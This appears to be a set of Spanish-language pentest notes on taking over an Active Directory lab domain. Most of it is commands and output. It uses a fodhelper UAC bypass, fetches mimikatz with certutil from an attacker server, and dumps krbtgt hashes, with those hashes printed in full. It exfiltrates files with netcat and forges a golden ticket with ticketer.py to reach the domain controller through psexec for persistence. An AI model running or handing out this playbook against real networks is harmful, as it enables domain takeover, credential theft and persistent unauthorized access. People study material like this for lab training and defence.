@@ -1,0 +1,132 @@
+Como tenemos credenciales de un usuario, vamos a utilizar rpcclient y ver si podemos sacar informacion.
+
+crackmapexec smb 192.168.56.0/24 -> para saber k IPs hay y cual es el DC.
+
+rpcclient -U "genwin.local\username%password" IP
+    - enumdomusers
+    - queryuser rid 
+ vemos que un rid tiene una descripcion en la que podemos ver una contraseña de un usuario. Nos conectamos con rdesktop
+
+rdesktop y vemos que estamo sen el grupo administrators:
+get-aduser -identit username -property memberof 
+
+ probamos hacer rdesktop en el DC y nos deja.
+
+
+UAC Bypass y asi poder ejecutar el mimikatz.exe:
+
+reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f 
+reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d "cmd /c start powershell.exe" /f
+fodhelper.exe
+
+Ahora con terminal como administrador, vamos a conseguir persistencia absoluta al DC pero como administrator y sin necesidad de contraseñas:
+
+cd ~/Desktop 
+certutil -f -urlcache -split http://IP;PORT/mimikatz.exe 
+mimikatz.exe 
+privilege::debug 
+lsadump::lsa /inject /name:krbtgt
+
+La informacion del lsadump::lsa /inject /name:krbtgt es parecida a esta:
+mimikatz # lsadump::lsa /inject /name:krbtgt
+Domain : GENWIN / S-1-5-21-191250647-416963902-705363252
+
+RID  : 000001f6 (502)
+User : krbtgt
+
+ * Primary
+    NTLM : 89f4e1d7cc84000ca05cb5ca1e0478c2
+    LM   :
+  Hash NTLM: 89f4e1d7cc84000ca05cb5ca1e0478c2
+    ntlm- 0: 89f4e1d7cc84000ca05cb5ca1e0478c2
+    lm  - 0: 086d8e274f4cf21495fadb84455f55cf
+
+ * WDigest
+    01  e4fbca08d5edabb9a140f9ea6f596531
+    02  53121394a6511a262d3844c97d4df45f
+    03  0366438eb55d6aa482892fa9f5755022
+    04  e4fbca08d5edabb9a140f9ea6f596531
+    05  53121394a6511a262d3844c97d4df45f
+    06  05b6adada535204e49ff165c89c34662
+    07  e4fbca08d5edabb9a140f9ea6f596531
+    08  11f37af04fb3bd82717b800458230dfd
+    09  11f37af04fb3bd82717b800458230dfd
+    10  e44be78358b99c331bc5996351ef1e35
+    11  6417b52e58e6b572990b2dfe60a5156d
+    12  11f37af04fb3bd82717b800458230dfd
+    13  84c9064dbd7b1e8f253f0e78f0d1ec8d
+    14  6417b52e58e6b572990b2dfe60a5156d
+    15  7cc00c602f693d02d797c6f398280ce4
+    16  7cc00c602f693d02d797c6f398280ce4
+    17  d7c3c665a95842623d1c9ea7b54e24eb
+    18  55ee32ffd4957a5a1543a60de34e515e
+    19  6a4386434a015a9eab57e16f97987a91
+    20  3c070fcbdfdd09de40920dad313440b2
+    21  a02b6b954cc54e4531d6ae635ea565cb
+    22  a02b6b954cc54e4531d6ae635ea565cb
+    23  b33e3f05088bcf95e58728081cfdcab5
+    24  e823ddfb33cca062e8c6ae25ffeeb0d9
+    25  e823ddfb33cca062e8c6ae25ffeeb0d9
+    26  a051c7d05ed0c69652750ad51d757738
+    27  c74afdec95e61e91d484469a1405034a
+    28  7338fd9ad3637f1104c6a8637e220b67
+    29  d406feecc3b0ab34df8726f93a87e425
+
+ * Kerberos
+    Default Salt : GENWIN.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 624c6e4c83eadf61
+
+ * Kerberos-Newer-Keys
+    Default Salt : GENWIN.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : c85e9630547ae6e637e5bc51a3613ba908330946f4f7dcaf13eaf36d9b2c2236
+      aes128_hmac       (4096) : 3c160ec268990568aeb1f9e1856f5905
+      des_cbc_md5       (4096) : 624c6e4c83eadf61
+
+ * NTLM-Strong-NTOWF
+    Random Value : dd7f477df6f76401530e006739f5ef2d
+
+mimikatz #
+
+
+
+
+Copiar archivo a nuestro PC:
+    - En linux:
+        impacket-smbserver smbFolder $(pwd) -smb2support
+    - En windows:
+        copy file.txt \\IP\smbFolder\file.txt
+Pero como no nos dejar la politca del PC hacemos esto otro:
+    
+- En linux:
+        1.- python3 -n http.server 
+        2.- nc -lvp 433 > file 
+    - En windows:
+        1.- certutil -f -urlcache -split http://IP;PORT/nc.exe 
+        2.- runas /user:username@genwin cmd -> porque en la powershell no podemos redirigir file 
+        2.- nc -w 15 IP 443 < file 
+        
+
+
+ticketer.py -nthash <krbtgt/service nthash>  -domain-sid <your domain SID> -domain <your domain FQDN> 
+
+-nthash -> 89f4e1d7cc84000ca05cb5ca1e0478c2 (NTLM)
+-domain-sid -> S-1-5-21-191250647-416963902-705363252 (Domain : GENWIN / S-1-5-21-191250647-416963902-705363252)
+-domain -> genwin.local 
+
+Comando final de ejemplo: 
+ticketer.py -nthash 89f4e1d7cc84000ca05cb5ca1e0478c2 -domain-sid S-1-5-21-191250647-416963902-705363252 -domain genwin.local Administrator
+
+y se nos crea un archivo Administrator.ccache
+
+En terminal:
+export KRB5CCNAME=path/Administrator.ccache
+
+psexec.py -n -k genwin.local/administrator@DC-Company cmd.exe
+
+y nos conectamos al DC como administrator sin necesidad de contraseñas.
+Y si por algun casual la cambia, podremos seguir entrando.
+Obviamente necesitamos tener en /etc/hosts la IP del DC que apunte al DC-Company:
+IP  DC-Company
